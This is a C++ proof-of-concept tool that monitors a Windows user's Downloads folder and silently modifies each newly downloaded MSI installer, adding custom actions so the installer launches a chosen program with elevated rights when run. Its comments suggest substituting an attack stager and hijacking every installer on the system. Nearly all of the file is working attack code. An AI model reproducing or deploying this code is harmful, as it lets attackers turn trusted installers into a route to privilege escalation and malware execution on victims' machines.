//FBI SUCKS
//Scans downloads folder for downloaded MSI files and changes them to execute elevated stuff. Just a for fun project. 
//(code will trigger when .msi files are added to downloads folder, not existing .msi files.. modify the code for that)
//For the user: add error handling to prevent crashes. 
//Instead of spawning elevated CMD.. spawn your stager or whatever
//You can also add binary data into an MSI and then execute it. May add this in future version but it's fairly simple if you read the MSDN docs.
//If this does not work on a particular MSI, open it in Orca to see why queries are failing
//You can also modify this PoC to simply hijack every MSI on the system
//Will trigger smartscreen if enabled, since it invalidates the publisher
#define _CRT_SECURE_NO_WARNINGS
using namespace std;

#include <ShlObj.h>
#include "iostream"
#include <stdio.h>
#include <windows.h>
#include <Msiquery.h>
#include <tchar.h>
#include <string>
#include <wchar.h>
#include "shlwapi.h"
#pragma comment(lib, "msi.lib")
#pragma comment(lib, "shlwapi.lib")
UINT runquery(const wchar_t* target, const wchar_t* blah, int type)
{
    PMSIHANDLE hDatabase = 0;
    PMSIHANDLE hView = 0;
    PMSIHANDLE hRec = 0;
    if (ERROR_SUCCESS == MsiOpenDatabase(target, MSIDBOPEN_TRANSACT, &hDatabase))
    {
        if (ERROR_SUCCESS == MsiDatabaseOpenView(hDatabase, blah, &hView))
        {
            MsiViewExecute(hView, NULL);
            if (type == 2)
            {
                UINT  Sequence = 0;
                MSIHANDLE hRecord;
                MsiViewFetch(hView, &hRecord);
                Sequence = MsiRecordGetInteger(hRecord, 1);
                return Sequence;
            }
            MsiViewClose(hView);
            MsiDatabaseCommit(hDatabase);
        }
    }
}
void hijack(const wchar_t* target)
{
    const wchar_t* blah = _T("INSERT INTO `Property` (`Property`, `Value`) VALUES ('Run', 'c:\\windows\\system32\\cmd.exe')"); //change what you want to run elevated here
    const wchar_t* blah2 = _T("INSERT INTO `CustomAction` (`Action`, `Type`,`Source`) VALUES ('RunFile', '3122','Run')");
    wchar_t blah3[256] = L"INSERT INTO `InstallExecuteSequence` (`Action`,`Sequence`) VALUES ('RunFile', '";
    const wchar_t* blah4 = _T("SELECT `Sequence` FROM `InstallExecuteSequence` WHERE `Action`='InstallInitialize'");
    const wchar_t* blah7 = _T("INSERT INTO `Property` (`Property`, `Value`) VALUES ('ALLUSERS', '1')");
    const wchar_t* blah5 = _T("UPDATE `Property` SET `Value`='1' WHERE `Property`='ALLUSERS'");
    const wchar_t* blah6 = _T("CREATE TABLE `CustomAction` (`Action` CHAR(72) NOT NULL, `Type` SHORT NOT NULL, `Source` CHAR(72),`Target` CHAR(255),`ExtendedType` LONG PRIMARY KEY `Action`)");
    runquery(target, blah6, 1);
    runquery(target, blah2, 1);
    runquery(target, blah, 1);
    //Need to add the Sequence after InstallInitialize otherwise it won't run with higher privileges
    UINT Sequence = runquery(target, blah4, 2);
    Sequence = Sequence + 5;
    wchar_t SeqString[50];
    swprintf_s(SeqString, L"%d", Sequence);
    wcsncat(blah3, SeqString, wcslen(SeqString));
    wcsncat(blah3, L"')", 3);
    runquery(target, blah3, 1);
    runquery(target, blah7, 1);
    runquery(target, blah5, 1);
}
void WatchDirectory(const wchar_t* target)
{
    HANDLE hDir = CreateFileW(
        target,
        FILE_LIST_DIRECTORY,
        FILE_SHARE_WRITE | FILE_SHARE_READ | FILE_SHARE_DELETE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS,
        NULL);
    while (TRUE)
    {
        BYTE buffer[4096];
        memset(buffer, 0, sizeof(buffer));
        DWORD dwBytesReturned = 0;
        ReadDirectoryChangesW(hDir, buffer, sizeof(buffer), TRUE, FILE_NOTIFY_CHANGE_FILE_NAME, &dwBytesReturned, NULL, NULL);
        BYTE* p = buffer;
        for (;;) {
             FILE_NOTIFY_INFORMATION* fni =
                reinterpret_cast<FILE_NOTIFY_INFORMATION*>(p);
            if(fni->Action == FILE_ACTION_ADDED || fni->Action == FILE_ACTION_RENAMED_NEW_NAME) {
                wstring Test(target);
                Test += L"\\";
                Test += fni->FileName;
                wchar_t* extension = PathFindExtension(fni->FileName);
                if (wcscmp(extension, L".msi") == 0)
                {
                         Sleep(1000);
                         hijack(Test.c_str());
                }
            }
            if (!fni->NextEntryOffset) break;
            p += fni->NextEntryOffset;
         }
    }
}
wchar_t* GetDownloadDirectory()
{
    LPWSTR lpRet = nullptr;
    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Downloads, 0, nullptr, &lpRet)))
    {
        return lpRet;
    }
    return NULL;
}
int main()
{
   wchar_t* blah = GetDownloadDirectory();
   WatchDirectory(blah);
    return 0;
}
